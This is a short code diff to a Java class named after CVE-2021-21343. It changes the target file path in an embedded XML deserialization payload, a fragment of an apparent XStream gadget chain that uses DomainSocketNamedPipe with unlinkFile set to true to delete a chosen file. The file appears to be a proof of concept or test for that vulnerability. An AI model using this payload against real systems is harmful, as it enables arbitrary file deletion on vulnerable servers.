@@ -51,7 +51,7 @@ public class CVE_2021_21343 {
                 "                        </threads>\n" +
                 "                        <parent class='sun.plugin2.ipc.unix.DomainSocketNamedPipe'>\n" +
                 "                          <sockClient>\n" +
-                "                            <fileName>/tmp/1.txt</fileName>\n" +
+                "                            <fileName>/tmp/1</fileName>\n" +
                 "                            <unlinkFile>true</unlinkFile>\n" +
                 "                          </sockClient>\n" +
                 "                          <connectionSync/>\n" +
